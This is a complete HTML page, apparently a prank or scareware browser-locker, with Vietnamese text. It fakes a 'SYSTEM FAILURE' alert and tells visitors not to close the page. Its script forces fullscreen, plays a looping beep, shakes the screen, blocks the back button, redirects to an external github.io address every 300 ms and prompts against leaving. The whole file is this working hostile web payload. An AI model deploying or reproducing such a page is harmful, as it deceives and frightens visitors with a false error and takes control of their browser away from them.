<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>System Error</title>

<style>
  body {
    margin: 0;
    background: black;
    color: red;
    font-family: monospace;
    text-align: center;
    overflow: hidden;
  }
  h1 {
    font-size: 40px;
    margin-top: 20%;
    animation: blink 0.5s infinite;
  }
  @keyframes blink {
    50% { opacity: 0; }
  }
</style>

</head>
<body>

<h1>⚠ SYSTEM FAILURE ⚠</h1>
<p>Đang sửa lỗi... KHÔNG TẮT TRANG!</p>

<audio id="sound" loop>
  <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
</audio>

<script>
const target = "https://phamtranceven-lang.github.io/ALO";

// fullscreen
function goFull() {
  const el = document.documentElement;
  if (el.requestFullscreen) el.requestFullscreen();
}
goFull();

// phát âm thanh (cần user click 1 lần)
document.body.addEventListener("click", () => {
  document.getElementById("sound").play();
});

// rung màn hình
setInterval(() => {
  document.body.style.transform =
    `translate(${Math.random()*20-10}px, ${Math.random()*20-10}px)`;
}, 50);

// chống back
history.pushState(null, null, location.href);
window.onpopstate = () => history.go(1);

// spam redirect
setInterval(() => {
  window.location.href = target;
}, 300);

// mở lại nếu bị đóng tab (không phải lúc nào cũng hoạt động)
window.onbeforeunload = function () {
  return "Bạn chắc chắn muốn thoát?";
};
</script>

</body>
</html>
